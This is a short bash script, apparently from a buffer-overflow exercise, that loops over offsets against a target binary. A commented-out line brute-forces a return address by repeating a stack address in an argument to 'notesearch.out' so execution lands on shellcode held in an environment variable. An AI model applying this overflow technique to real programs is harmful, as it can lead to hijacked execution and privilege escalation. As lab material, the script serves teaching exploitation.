#!/bin/bash

# When SHELLCODE env var address on stack found trying to find out return address 
# for i in $(seq 0 1 70); do echo trying offset $i; ./notesearch.out $(perl -e "print '\x9c\xcb\xff\xff'x$i"); done
echo '[+] Fuzzing with offset... '
for i in $(seq 0 1 300); do echo trying offset $i; ./$1.out $i; done

echo '[+] Done!'